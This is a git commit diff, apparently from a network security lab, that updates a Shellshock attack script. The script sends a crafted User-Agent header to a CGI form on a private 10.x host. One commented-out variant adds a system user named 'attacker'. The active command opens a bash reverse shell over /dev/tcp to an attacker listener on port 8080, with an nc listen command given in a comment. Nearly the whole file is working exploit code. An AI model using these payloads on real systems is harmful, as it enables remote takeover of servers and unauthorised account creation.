5468e599c55132d374714ecaadfd0af579b6171a
oikuda <valtervasic@gmail.com>
2015-05-12 16:17:58 +0200

    Updated attack script.

--- service/shellshock/shellshock.sh
+++ service/shellshock/shellshock.sh
@@ -1,4 +1,7 @@
 #sudo himage attacker fetch -o- -q --user-agent='() { echo ; }; echo "Content-type: text/plain"; echo ""; echo "`/usr/sbin/pw useradd attacker`";' http://10.0.1.10/form.sh
 # listen on attacker in another terminal
 # nc -l 8080 -vvv
-sudo himage Attacker fetch -o- -q --user-agent='() { echo ; }; echo "Content-type: text/plain"; echo ""; echo "`/usr/local/bin/bash -i >& /dev/tcp/10.0.0.21/8080 0>&1`";' http://10.0.1.10/form.sh
+
+host="10.0.1.10"
+
+himage Attacker fetch -o- -q --user-agent='() { echo ; }; echo "Content-type: text/plain"; echo ""; echo "`/usr/local/bin/bash -i >& /dev/tcp/10.0.0.210/8080 0>&1`";' http://$host/form.sh
